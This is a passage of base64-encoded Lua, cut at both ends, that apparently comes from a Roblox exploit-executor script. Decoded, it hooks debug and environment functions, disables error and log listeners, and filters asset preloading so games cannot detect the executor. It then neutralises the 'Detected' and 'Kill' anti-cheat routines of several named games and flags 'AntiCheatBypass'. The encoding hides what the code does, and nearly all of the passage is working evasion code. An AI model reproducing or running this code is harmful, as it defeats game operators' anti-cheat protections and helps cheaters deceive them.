Wk6RmluZEZpcnN0Q2hpbGQoR3VpTmFtZSkKCQkJCQkJCWlmIEd1aUluc3RhbmNlIHRoZW4KCQkJCQkJCQl0YWJsZS5pbnNlcnQoRmlsdGVyZWQsIEd1aUluc3RhbmNlKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoKCQkJCQkJaWYgVmFsdWUgPT0gR2FtZUluc3RhbmNlIHRoZW4KCQkJCQkJCWZvciBfLCBDaGlsZCBpbiBwYWlycyhHYW1lSW5zdGFuY2U6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCQkJCQlpZiBDaGlsZCB+PSBDb3JlR3VpIHRoZW4KCQkJCQkJCQkJdGFibGUuaW5zZXJ0KEZpbHRlcmVkLCBDaGlsZCkKCQkJCQkJCQllbmQKCQkJCQkJCWVuZAoJCQkJCQllbmQKCQkJCQllbHNlCgkJCQkJCWlmIG5vdCBDb3JlR3VpOklzQW5jZXN0b3JPZihWYWx1ZSkgdGhlbgoJCQkJCQkJdGFibGUuaW5zZXJ0KEZpbHRlcmVkLCBWYWx1ZSkKCQkJCQkJZWxzZQoJCQkJCQkJLS0gT25seSBpbmNsdWRlIGlmIGl0J3MgYSBkZXNjZW5kYW50IG9mIG9uZSBvZiB0aGUgZGVmYXVsdCBHVUlzCgkJCQkJCQlmb3IgXywgRGVmYXVsdEd1aU5hbWUgaW4gcGFpcnMoUm9ibG94R3VpcykgZG8KCQkJCQkJCQlsb2NhbCBEZWZhdWx0R3VpSW5zdGFuY2UgPSBDb3JlR3VpOkZpbmRGaXJzdENoaWxkKERlZmF1bHRHdWlOYW1lKQoJCQkJCQkJCWlmIERlZmF1bHRHdWlJbnN0YW5jZSB0aGVuCgkJCQkJCQkJCWlmIFZhbHVlID09IERlZmF1bHRHdWlJbnN0YW5jZSBvciBEZWZhdWx0R3VpSW5zdGFuY2U6SXNBbmNlc3Rvck9mKFZhbHVlKSB0aGVuCgkJCQkJCQkJCQl0YWJsZS5pbnNlcnQoRmlsdGVyZWQsIFZhbHVlKQoJCQkJCQkJCQkJYnJlYWsKCQkJCQkJCQkJZW5kCgkJCQkJCQkJZW5kCgkJCQkJCQllbmQKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgoJCQlzZXR0aHJlYWRjb250ZXh0KE9sZENvbnRleHQpCgkJCXJldHVybiBGaWx0ZXJlZAoJCWVuZAoKCQlsb2NhbCBCbGFja2xpc3RlZEFzc2V0cyA9IHt9CgkJbG9jYWwgQ29udGVudFByb3ZpZGVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb250ZW50UHJvdmlkZXIiKQoKCQlsb2NhbCBmdW5jdGlvbiBsb2dEZWJ1Z01lc3NhZ2UoLi4uKQoJCQlsb2NhbCBTdHJpbmdzID0ge30KCgkJCWZvciBfLCB2IGluIG5leHQsIHsgLi4uIH0gZG8KCQkJCXRhYmxlLmluc2VydChTdHJpbmdzLCB0b3N0cmluZyh2KSkKCQkJZW5kCgoJCQlsb2NhbCBNZXNzYWdlID0gdGFibGUuY29uY2F0KFN0cmluZ3MsICIsICIpCgkJCXdhcm4oYHtNZXNzYWdlfVxuYCkKCQllbmQKCgkJbG9jYWwgZnVuY3Rpb24gVmFsaWRUcmFjZWJhY2socykKCQkJbG9jYWwgZG90UG9zID0gc3RyaW5nLmZpbmQocywgIiUuIikKCQkJbG9jYWwgY29sb25Qb3MgPSBzdHJpbmcuZmluZChzLCAiOiIpCgoJCQlpZiBub3QgZG90UG9zIHRoZW4KCQkJCXJldHVybiBmYWxzZQoJCQllbmQKCgkJCWlmIG5vdCBjb2xvblBvcyB0aGVuCgkJCQlyZXR1cm4gdHJ1ZQoJCQllbmQKCgkJCXJldHVybiBkb3RQb3MgPCBjb2xvblBvcwoJCWVuZAoKCQlsb2NhbCBmdW5jdGlvbiBUcmFjZWJhY2tMaW5lcyhzdHIpCgkJCWxvY2FsIHBvcyA9IDEKCQkJcmV0dXJuIGZ1bmN0aW9uKCkKCQkJCWlmIG5vdCBwb3MgdGhlbgoJCQkJCXJldHVybiBuaWwKCQkJCWVuZAoJCQkJbG9jYWwgcDEsIHAyID0gc3RyaW5nLmZpbmQoc3RyLCAiXHI/XG4iLCBwb3MpCgkJCQlsb2NhbCBsaW5lCgkJCQlpZiBwMSB0aGVuCgkJCQkJbGluZSA9IHN0cjpzdWIocG9zLCBwMSAtIDEpCgkJCQkJcG9zID0gcDIgKyAxCgkJCQllbHNlCgkJCQkJbGluZSA9IHN0cjpzdWIocG9zKQoJCQkJCXBvcyA9IG5pbAoJCQkJZW5kCgkJCQlyZXR1cm4gbGluZQoJCQllbmQKCQllbmQKCgkJT2xkRGVidWdUcmFjZWJhY2sgPSBzaGFyZWQuU2FmZUhvb2soZ2V0cmVudigpLmRlYnVnLnRyYWNlYmFjaywgZnVuY3Rpb24oKQoJCQlpZiBjaGVja2NhbGxlcigpIHRoZW4KCQkJCXJldHVybiBPbGREZWJ1Z1RyYWNlYmFjaygpCgkJCWVuZAoKCQkJbG9jYWwgVHJhY2ViYWNrID0gT2xkRGVidWdUcmFjZWJhY2soKQoJCQlsb2NhbCBOZXdUcmFjZWJhY2sgPSB7fQoKCQkJZm9yIExpbmUgaW4gVHJhY2ViYWNrTGluZXMoVHJhY2ViYWNrKSBkbwoJCQkJaWYgbm90IFZhbGlkVHJhY2ViYWNrKExpbmUpIHRoZW4KCQkJCQljb250aW51ZQoJCQkJZW5kCgoJCQkJdGFibGUuaW5zZXJ0KE5ld1RyYWNlYmFjaywgTGluZSkKCQkJZW5kCgoJCQlyZXR1cm4gdGFibGUuY29uY2F0KE5ld1RyYWNlYmFjaywgIlxuIikKCQllbmQpCgoJCU9sZERlYnVnSW5mbyA9IHNoYXJlZC5TYWZlSG9vayhnZXRyZW52KCkuZGVidWcuaW5mbywgZnVuY3Rpb24oLi4uKQoJCQlsb2NhbCBUb0luc3BlY3QsIExldmVsT3JJbmZvLCBfVGhyZWFkSW5mbyA9IC4uLgoKCQkJaWYKCQkJCWNoZWNrY2FsbGVyKCkKCQkJCW9yIHR5cGVvZihUb0luc3BlY3QpID09ICJmdW5jdGlvbiIKCQkJCW9yIHR5cGVvZihUb0luc3BlY3QpID09ICJ0aHJlYWQiCgkJCQlvciBub3QgcGNhbGwoZnVuY3Rpb24oTGV2ZWxPckluZm8pIC0tIFZhbGlkYXRlIGFyZ3VtZW50cwoJCQkJCU9sZERlYnVnSW5mbyhmdW5jdGlvbigpIGVuZCwgTGV2ZWxPckluZm8pCgkJCQllbmQsIExldmVsT3JJbmZvKQoJCQl0aGVuCgkJCQlyZXR1cm4gT2xkRGVidWdJbmZvKC4uLikKCQkJZW5kCgoJCQlsb2NhbCBSZWNvbnN0cnVjdGVkQ29uc3RydWN0ZWRTdGFjayA9IHt9CgkJCWZvciBMZXZlbCA9IDIsIDE5OTk3IGRvCgkJCQlsb2NhbCBGdW5jdGlvbiwgU291cmNlLCBMaW5lLCBOYW1lLCBOdW1iZXJPZkFyZ3MsIFZhcmFyZ3MgPSBPbGREZWJ1Z0luZm8oTGV2ZWwsICJmc2xuYSIpCgoJCQkJaWYgbm90IEZ1bmN0aW9uIG9yIG5vdCBTb3VyY2Ugb3Igbm90IExpbmUgb3Igbm90IE5hbWUgdGhlbgoJCQkJCWJyZWFrCgkJCQllbmQKCgkJCQlpZiBpc2V4ZWN1dG9yY2xvc3VyZShGdW5jdGlvbikgYW5kIG5vdCBzaGFyZWQuSG9va2luZy5JbmNsdWRlSW5TdGFja0Z1bmN0aW9uc1tGdW5jdGlvbl0gdGhlbgoJCQkJCWNvbnRpbnVlCgkJCQllbmQKCgkJCQl0YWJsZS5pbnNlcnQoUmVjb25zdHJ1Y3RlZENvbnN0cnVjdGVkU3RhY2ssIHsKCQkJCQlmID0gRnVuY3Rpb24sCgkJCQkJcyA9IFNvdXJjZSwKCQkJCQlsID0gTGluZSwKCQkJCQluID0gTmFtZSwKCQkJCQlhID0geyBOdW1iZXJPZkFyZ3MsIFZhcmFyZ3MgfSwKCQkJCX0pCgkJCWVuZAoKCQkJbG9jYWwgSW5mb0xldmVsID0gUmVjb25zdHJ1Y3RlZENvbnN0cnVjdGVkU3RhY2tbVG9JbnNwZWN0XQoKCQkJaWYgbm90IEluZm9MZXZlbCB0aGVuCgkJCQktLSBNYXggbGV2ZWwgaXMgMTk5OTcgc28gdGhpcyBndWFyYW50ZWVzIHRoYXQgaXQgd2lsbCByZXR1cm4gbm90aGluZwoJCQkJcmV0dXJuIE9sZERlYnVnSW5mbygzZTQsIExldmVsT3JJbmZvKQoJCQllbmQKCgkJCWxvY2FsIFJldHVyblJlc3VsdCA9IHt9CgkJCWZvciBpZHgsIGluZm8gaW4gc3RyaW5nLnNwbGl0KExldmVsT3JJbmZvLCAiIikgZG8KCQkJCWxvY2FsIFZhbHVlID0gSW5mb0xldmVsW2luZm9dCgoJCQkJaWYgdHlwZW9mKFZhbHVlKSA9PSAidGFibGUiIHRoZW4KCQkJCQlmb3IgXywgdiBpbiBWYWx1ZSBkbwoJCQkJCQl0YWJsZS5pbnNlcnQoUmV0dXJuUmVzdWx0LCB2KQoJCQkJCWVuZAoKCQkJCQljb250aW51ZQoJCQkJZW5kCgoJCQkJdGFibGUuaW5zZXJ0KFJldHVyblJlc3VsdCwgVmFsdWUpCgkJCWVuZAoKCQkJcmV0dXJuIHRhYmxlLnVucGFjayhSZXR1cm5SZXN1bHQsIDEsICNSZXR1cm5SZXN1bHQpCgkJZW5kKQoKCQlPbGRGZW52ID0gc2hhcmVkLlNhZmVIb29rKGdldHJlbnYoKS5nZXRmZW52LCBmdW5jdGlvbiguLi4pCgkJCWlmIGNoZWNrY2FsbGVyKCkgdGhlbgoJCQkJcmV0dXJuIE9sZEZlbnYoLi4uKQoJCQllbmQKCgkJCWxvY2FsIFRvSW5zcGVjdCA9IC4uLgoKCQkJaWYgVG9JbnNwZWN0ID09IDAgdGhlbgoJCQkJcmV0dXJuIGdldHJlbnYoKQoJCQllbHNlaWYgVG9JbnNwZWN0ID09IG5pbCB0aGVuCgkJCQlyZXR1cm4gT2xkRmVudiguLi4pCgkJCWVuZAoKCQkJbG9jYWwgU3VjY2VzcywgUmVzdWx0aW5nRW52ID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJaWYgdHlwZW9mKFRvSW5zcGVjdCkgPT0gIm51bWJlciIgdGhlbgoJCQkJCXJldHVybiBPbGRGZW52KFRvSW5zcGVjdCArIDMpCgkJCQllbmQKCgkJCQlyZXR1cm4gT2xkRmVudihUb0luc3BlY3QpCgkJCWVuZCkKCgkJCWlmIG5vdCBTdWNjZXNzIHRoZW4KCQkJCXJldHVybiBPbGRGZW52KC4uLikKCQkJZW5kCgoJCQlpZiB0eXBlb2YoVG9JbnNwZWN0KSA9PSAiZnVuY3Rpb24iIHRoZW4KCQkJCWlmIHR5cGVvZihSZXN1bHRpbmdFbnZbImdldGdlbnYiXSkgPT0gImZ1bmN0aW9uIiBhbmQgaXNleGVjdXRvcmNsb3N1cmUoUmVzdWx0aW5nRW52WyJnZXRnZW52Il0pIHRoZW4KCQkJCQlyZXR1cm4gZ2V0cmVudigpCgkJCQllbmQKCgkJCQlyZXR1cm4gUmVzdWx0aW5nRW52CgkJCWVuZAoKCQkJbG9jYWwgUmVjb25zdHJ1Y3RlZENvbnN0cnVjdGVkU3RhY2sgPSB7fQoJCQlmb3IgTGV2ZWwgPSAyLCAxOTk5NyBkbwoJCQkJbG9jYWwgU3RhY2tJbmZvU3VjY2VzcywgRGF0YSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlyZXR1cm4gewoJCQkJCQlFbnZpcm9uZW1lbnQgPSBPbGRGZW52KExldmVsICsgMyksCgkJCQkJCUZ1bmN0aW9uID0gT2xkRGVidWdJbmZvKExldmVsICsgMywgImYiKSwKCQkJCQl9CgkJCQllbmQpCgoJCQkJaWYgbm90IFN0YWNrSW5mb1N1Y2Nlc3Mgb3Igbm90IERhdGEgdGhlbgoJCQkJCWJyZWFrCgkJCQllbmQKCgkJCQlsb2NhbCBFbnZpcm9uZW1lbnQgPSBEYXRhLkVudmlyb25lbWVudAoJCQkJLS0gbG9jYWwgRnVuY3Rpb24gPSBEYXRhLkZ1bmN0aW9uCgoJCQkJaWYgdHlwZW9mKEVudmlyb25lbWVudFsiZ2V0Z2VudiJdKSA9PSAiZnVuY3Rpb24iIGFuZCBpc2V4ZWN1dG9yY2xvc3VyZShFbnZpcm9uZW1lbnRbImdldGdlbnYiXSkgdGhlbgoJCQkJCUVudmlyb25lbWVudCA9IGdldHJlbnYoKQoJCQkJZW5kCgoJCQkJdGFibGUuaW5zZXJ0KFJlY29uc3RydWN0ZWRDb25zdHJ1Y3RlZFN0YWNrLCBFbnZpcm9uZW1lbnQpCgkJCWVuZAoKCQkJbG9jYWwgSW5mb0xldmVsID0gUmVjb25zdHJ1Y3RlZENvbnN0cnVjdGVkU3RhY2tbVG9JbnNwZWN0XQoKCQkJaWYgbm90IEluZm9MZXZlbCB0aGVuCgkJCQktLSBNYXggbGV2ZWwgaXMgMTk5OTcgc28gdGhpcyBndWFyYW50ZWVzIHRoYXQgaXQgd2lsbCByZXR1cm4gZXJyb3IKCQkJCXJldHVybiBPbGRGZW52KDNlNCkKCQkJZW5kCgoJCQlyZXR1cm4gSW5mb0xldmVsCgkJZW5kKQoKCQktLSBEaXNhYmxlIGFsbCBibGFja2xpc3RlZCBjb25uZWN0aW9ucwoKCQlsb2NhbCBCbGFja2xpc3RlZFNpZ25hbHMgPSB7CgkJCWdhbWU6R2V0U2VydmljZSgiTG9nU2VydmljZSIpLk1lc3NhZ2VPdXQsCgkJCWdhbWU6R2V0U2VydmljZSgiU2NyaXB0Q29udGV4dCIpLkVycm9yLAoJCX0KCgkJbG9jYWwgRHVtbXlTaWduYWxzID0ge30KCgkJZm9yIF8sIFNpZ25hbCBpbiBuZXh0LCBCbGFja2xpc3RlZFNpZ25hbHMgZG8KCQkJZm9yIF8sIENvbm5lY3Rpb24gaW4gbmV4dCwgZ2V0Y29ubmVjdGlvbnMoU2lnbmFsKSBkbwoJCQkJLS0gZGF3ZyB3aHkgZG9lcyB2b2xjYW5vIHJldHVybiBhIHRocmVhZCBmb3IgQ29ubmVjdGlvbi5GdW5jdGlvbgoJCQkJaWYKCQkJCQkoQ29ubmVjdGlvbi5GdW5jdGlvbgoJCQkJCWFuZCB0eXBlKENvbm5lY3Rpb24uRnVuY3Rpb24pID09ICJmdW5jdGlvbiIKCQkJCQlhbmQgaXNleGVjdXRvcmNsb3N1cmUoQ29ubmVjdGlvbi5GdW5jdGlvbikpIG9yCgkJCQkJQ29ubmVjdGlvbi5GdW5jdGlvbiA9PSBuaWwgLS0gQ29yZVNjcmlwdCBjb25uZWN0aW9ucyByZXR1cm4gbmlsIGZvciBGdW5jdGlvbgoJCQkJdGhlbgoJCQkJCWNvbnRpbnVlCgkJCQllbHNlCgkJCQkJQ29ubmVjdGlvbjpEaXNhYmxlKCkKCQkJCWVuZAoJCQllbmQKCQllbmQKCgkJbG9jYWwgT2xkSW5kZXgKCQlPbGRJbmRleCA9IGhvb2ttZXRhbWV0aG9kKGdhbWUsICJfX2luZGV4IiwgZnVuY3Rpb24oU2VsZiwgS2V5KQoJCQlpZiBjaGVja2NhbGxlcigpIHRoZW4KCQkJCXJldHVybiBPbGRJbmRleChTZWxmLCBLZXkpCgkJCWVuZAoJCQkKCQkJbG9jYWwgUmVzdWx0ID0gT2xkSW5kZXgoU2VsZiwgS2V5KQoKCQkJZm9yIF8sIEJsYWNrbGlzdGVkU2lnbmFsIGluIG5leHQsIEJsYWNrbGlzdGVkU2lnbmFscyBkbwoJCQkJaWYgUmVzdWx0ID09IEJsYWNrbGlzdGVkU2lnbmFsIHRoZW4KCQkJCQlpZiBub3QgRHVtbXlTaWduYWxzW0JsYWNrbGlzdGVkU2lnbmFsXSB0aGVuCgkJCQkJCUR1bW15U2lnbmFsc1tCbGFja2xpc3RlZFNpZ25hbF0gPSBJbnN0YW5jZS5uZXcoIkJpbmRhYmxlRXZlbnQiKS5FdmVudAoJCQkJCWVuZAoKCQkJCQlyZXR1cm4gRHVtbXlTaWduYWxzW0JsYWNrbGlzdGVkU2lnbmFsXQoJCQkJZW5kCgkJCWVuZAoKCQkJcmV0dXJuIFJlc3VsdAoJCWVuZCkKCgkJbG9jYWwgT2xkTmV3SW5kZXgKCQlPbGROZXdJbmRleCA9IGhvb2ttZXRhbWV0aG9kKGdhbWUsICJfX25ld2luZGV4IiwgZnVuY3Rpb24oU2VsZiwgS2V5LCBWYWx1ZSkKCQkJbG9jYWwgQXNzZXRJbmRleGVzID0gewoJCQkJWyJNZXNoSUQiXSA9IHRydWUsCgkJCQlbIlRleHR1cmVJRCJdID0gdHJ1ZSwKCQkJCVsiTWVzaElkIl0gPSB0cnVlLAoJCQkJWyJUZXh0dXJlSWQiXSA9IHRydWUsCgkJCQlbIkltYWdlIl0gPSB0cnVlLAoJCQkJWyJTb3VuZElkIl0gPSB0cnVlLAoJCQkJWyJBbmltYXRpb25JZCJdID0gdHJ1ZSwKCQkJfQoKCQkJaWYgQXNzZXRJbmRleGVzW0tleV0gdGhlbgoJCQkJbG9jYWwgQXNzZXRJZCA9IFZhbHVlCgoJCQkJaWYgdHlwZW9mKEFzc2V0SWQpID09ICJzdHJpbmciIHRoZW4KCQkJCQlBc3NldElkID0gdG9udW1iZXIoQXNzZXRJZDptYXRjaCgiJWQrIikpCgkJCQllbmQKCgkJCQlpZiBBc3NldElkIGFuZCBub3QgQmxhY2tsaXN0ZWRBc3NldHNbQXNzZXRJZF0gdGhlbgoJCQkJCS0tIENoZWNrIGlmIHRoZSBhc3NldCBpcyBhbHJlYWR5IGxvYWRlZCBzbyB3ZSBkb24ndCBhY2NpZGVudGFsbHkgYmxhY2tsaXN0IGEgbGVnaXRpbWF0ZSBhc3NldAoJCQkJCWxvY2FsIEFzc2V0TG9hZGVkID0gZmFsc2UKCQkJCQlpZgoJCQkJCQlDb250ZW50UHJvdmlkZXI6R2V0QXNzZXRGZXRjaFN0YXR1cygicmJ4YXNzZXRpZDovLyIgLi4gQXNzZXRJZCkKCQkJCQkJPT0gRW51bS5Bc3NldEZldGNoU3RhdHVzLlN1Y2Nlc3MKCQkJCQl0aGVuCgkJCQkJCUFzc2V0TG9hZGVkID0gdHJ1ZQoJCQkJCWVuZAoKCQkJCQlpZiBjaGVja2NhbGxlcigpIHRoZW4KCQkJCQkJaWYgbm90IEFzc2V0TG9hZGVkIHRoZW4KCQkJCQkJCUJsYWNrbGlzdGVkQXNzZXRzW0Fzc2V0SWRdID0gdHJ1ZQoJCQkJCQllbmQKCQkJCQllbHNlCgkJCQkJCWlmIEJsYWNrbGlzdGVkQXNzZXRzW0Fzc2V0SWRdIHRoZW4KCQkJCQkJCS0tIFRoZSBnYW1lIGlzIGRvaW5nIGEgc2FuaXR5IGNoZWNrIHdoZXJlIGl0IGludGVudGlvbmFsbHkgbG9hZHMgYSBibGFja2xpc3RlZCBhc3NldAoJCQkJCQkJLS0gdG8gc2VlIGlmIHRoZSBleGVjdXRvciBpcyBibG9ja2luZyBpdC4gV2UgbmVlZCB0byByZW1vdmUgaXQgZnJvbSB0aGUgYmxhY2tsaXN0CgkJCQkJCQktLSBzbyBpdCBkb2Vzbid0IGdldCBibG9ja2VkLgoJCQkJCQkJQmxhY2tsaXN0ZWRBc3NldHNbQXNzZXRJZF0gPSBuaWwKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBLZXkgPT0gIkNhbkNvbGxpZGUiIGFuZCAobm90IGNoZWNrY2FsbGVyKCkpIHRoZW4KCQkJCWxvY2FsIE5hbWUgPSBkZWJ1Zy5pbmZvKDMsICJuIikKCQkJCWlmIE5hbWUgYW5kIE5hbWU6bWF0Y2goIk9iZnVzY2F0ZWQiKSB0aGVuCgkJCQkJcmV0dXJuIGNvcm91dGluZS55aWVsZCgpCgkJCQllbmQKCQkJZW5kCgoJCQlyZXR1cm4gT2xkTmV3SW5kZXgoU2VsZiwgS2V5LCBWYWx1ZSkKCQllbmQpCgoJCS0tIE5vdyB0aGF0IHdlIHdpbGwgcHJveHkgYW5kIHJlY29yZCBhbGwgYXNzZXRzIHRoZSBleGVjdXRvciB1c2VzLCB3ZSBjYW4gbG9hZCB0aGUgaG9vay4KCgkJbG9jYWwgT2xkUHJlbG9hZEFzeW5jCgkJT2xkUHJlbG9hZEFzeW5jID0gc2hhcmVkLlNhZmVIb29rKAoJCQlDb250ZW50UHJvdmlkZXIuUHJlbG9hZEFzeW5jLAoJCQlmdW5jdGlvbihTZWxmLCBBc3NldHMsIE9yaWdpbmFsQ2FsbGJhY2spCgkJCQlpZiBTZWxmIH49IENvbnRlbnRQcm92aWRlciBvciB0eXBlKEFzc2V0cykgfj0gInRhYmxlIiBvciB0eXBlKE9yaWdpbmFsQ2FsbGJhY2spIH49ICJmdW5jdGlvbiIgdGhlbiAtLW5vdGU6IGNhbGxiYWNrIGNhbiBiZSBuaWwgYnV0IGluIHRoYXQgY2FzZSBpdCdzIHVzZWxlc3MgYW55d2F5cwoJCQkJCXJldHVybiBPbGRQcmVsb2FkQXN5bmMoU2VsZiwgQXNzZXRzLCBPcmlnaW5hbENhbGxiYWNrKQoJCQkJZW5kCgoJCQkJLS1jaGVjayBmb3IgYW55IGVycm9ycyB0aGF0IEkgbWlnaHQndmUgbWlzc2VkIChzdWNoIGFzIHRhYmxlIGJlaW5nIHtbMl0gPSAic29tZXRoaW5nIn0gd2hpY2ggY2F1c2VzICJVbmFibGUgdG8gY2FzdCB0byBBcnJheSIpCgkJCQlsb2NhbCBlcnIKCQkJCXRhc2suc3Bhd24oCgkJCQkJZnVuY3Rpb24oKSAtLVRJTCBjYWxsaW5nIGEgQyB5aWVsZCBmdW5jdGlvbiBpbnNpZGUgYSBDIHlpZWxkIGZ1bmN0aW9uIGlzIGEgYmFkIGlkZWEgKCJjYW5ub3QgcmVzdW1lIG5vbi1zdXNwZW5kZWQgY29yb3V0aW5lIikKCQkJCQkJbG9jYWwgcywgZSA9IHBjYWxsKE9sZFByZWxvYWRBc3luYywgU2VsZiwgQXNzZXRzKQoJCQkJCQlpZiBub3QgcyBhbmQgZSB0aGVuCgkJCQkJCQllcnIgPSBlCgkJCQkJCWVuZAoJCQkJCWVuZAoJCQkJKQoKCQkJCWlmIGVyciB0aGVuCgkJCQkJcmV0dXJuIE9sZFByZWxvYWRBc3luYyhTZWxmLCBBc3NldHMpIC0tZG9uJ3QgcGFzcyB0aGUgY2FsbGJhY2ssIGp1c3QgaW4gY2FzZQoJCQkJZW5kCgoJCQkJQXNzZXRzID0gRmlsdGVyVGFibGUoQXNzZXRzKQoJCQkJcmV0dXJuIE9sZFByZWxvYWRBc3luYyhTZWxmLCBBc3NldHMsIE9yaWdpbmFsQ2FsbGJhY2spCgkJCWVuZAoJCSkKICAgICAgICBlbmQpKCkKCiAgICAgICAgbG9jYWwgU3ByaW50X01vZHVsZSA9IHJlcXVpcmUoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLk1vZHVsZXMuR2FtZS5TcHJpbnQpCiAgICAgICAgbG9jYWwgRnVuY3Rpb25fVGFibGVfVXBWYWx1ZSA9IGRlYnVnLmdldHVwdmFsdWUoU3ByaW50X01vZHVsZS5sb2FkZWQsIDExKQoKICAgICAgICBsb2NhbCBfZ2V0ZmVudjsgX2dldGZlbnYgPSBob29rZnVuY3Rpb24oZ2V0cmVudigpLmdldGZlbnYsIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKGxldmVsKQogICAgICAgICAgICBpZiBkZWJ1Zy50cmFjZWJhY2soKTpmaW5kKCJ2YWxpZGl0eV9jaGVjayIpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoe30sIHsKICAgICAgICAgICAgICAgICAgICBfX2luZGV4ID0gZnVuY3Rpb24oLi4uKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgcmV0dXJuIF9nZXRmZW52KGxldmVsKTsKICAgICAgICBlbmQpKTsKCiAgICAgICAgZ2V0Z2VudigpLlNlbmRfUmVtb3RlID0gRnVuY3Rpb25fVGFibGVfVXBWYWx1ZS5zZW5kOwoKICAgICAgICBnZXRnZW52KCkuQW50aUNoZWF0QnlwYXNzID0gdHJ1ZTsKICAgIGVuZAoKICAgIGlmIEdhbWVfTmFtZSA9PSAiVW5pdmVyc2FsIiBvciBHYW1lX05hbWUgPT0gIlJvYWQgVG8gUmljaGVzIiBvciBHYW1lX05hbWUgPT0gIlN0cmVldCBMaWZlIiBvciBHYW1lX05hbWUgPT0gIlRoZSBCcm9ueCIgb3IgR2FtZV9OYW1lID09ICJUb3duIiBhbmQgbm90IFNvbGFyYSB0aGVuCiAgICAgICAgbG9jYWwgRFRDOwoKICAgICAgICBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gbmV4dCwgZ2V0Z2ModHJ1ZSkgZG8KICAgICAgICAgICAgICAgIGlmIHR5cGUoVmFsdWUpID09ICJ0YWJsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIERldGVjdGVkID0gcmF3Z2V0KFZhbHVlLCAiRGV0ZWN0ZWQiKTsKICAgICAgICAgICAgICAgICAgICBsb2NhbCBLaWxsID0gcmF3Z2V0KFZhbHVlLCAiS2lsbCIpOwogICAgICAgICAgICAgICAgICAgIGlmIHR5cGUoRGV0ZWN0ZWQpID09ICJmdW5jdGlvbiIgYW5kIG5vdCBEVEMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBEVEMgPSBEZXRlY3RlZAogICAgICAgICAgICAgICAgICAgICAgICBob29rZnVuY3Rpb24oRGV0ZWN0ZWQsIGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCk7CiAgICAgICAgICAgICAgICAgICAgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIHJhd2dldChWYWx1ZSwgIlZhcmlhYmxlcyIpIGFuZCByYXdnZXQoVmFsdWUsICJQcm9jZXNzIikgYW5kIHR5cGVvZihLaWxsKSA9PSAiZnVuY3Rpb24iIHRoZW4gICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGhvb2tmdW5jdGlvbihLaWxsLCBmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIGVuZDsKICAgICAgICBlbmQpKCkKCiAgICAgICAgbG9jYWwgT2xkOyBPbGQgPSBob29rZnVuY3Rpb24oZ2V0cmVudigpLmRlYnVnLmluZm8sIExQSF9OT19VUFZBTFVFUyhmdW5jdGlvbiguLi4pCiAgICAgICAgICAgIGxvY2FsIExldmVsT3JGdW5jLCBJbmZvID0gLi4uCiAgICAgICAgICAgIGlmIERUQyBhbmQgTGV2ZWxPckZ1bmMgPT0gRFRDIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBjb3JvdXRpbmUueWllbGQoY29yb3V0aW5lLnJ1bm5pbmcoKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBPbGQoLi4uKQogICAgICAgIGVuZCkpOwoKICAgICAgICBnZXRnZW52KCkuQW50aUNoZWF0QnlwYXNzID0gdHJ1ZQogICAgZW5kCgogICAgaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIG5vdCBTb2xhcmEgdGhlbgogICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gZ2V0Y29ubmVjdGlvbnMoU2VydmljZXMuU2NyaXB0Q29udGV4dC5FcnJvcikgZG8KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgVmFsdWU6RGlzYWJsZSgpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIFZhbHVlOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gU2VydmljZXMuUmVwbGljYXRlZFN0b3JhZ2UuV29ya3NwYWNlLkhvbWVsZXNzOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgVmFsdWUuUGFyZW50ID0gU2VydmljZXMuV29ya3NwYWNlLkZvbGRlcnMuSG9tZWxlc3NQZW9wbGUKICAgICAgICBlbmQKCiAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBTZXJ2aWNlcy5Xb3Jrc3BhY2UuRm9sZGVycy5Ib21lbGVzc1Blb3BsZTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgIFZhbHVlOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgnUGFyZW50Jyk6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgVmFsdWUuUGFyZW50ID0gU2VydmljZXMuV29ya3NwYWNlLkZvbGRlcnMuSG9tZWxlc3NQZW9wbGUKICAgICAgICAgICAgZW5kKSkKICAgICAgIC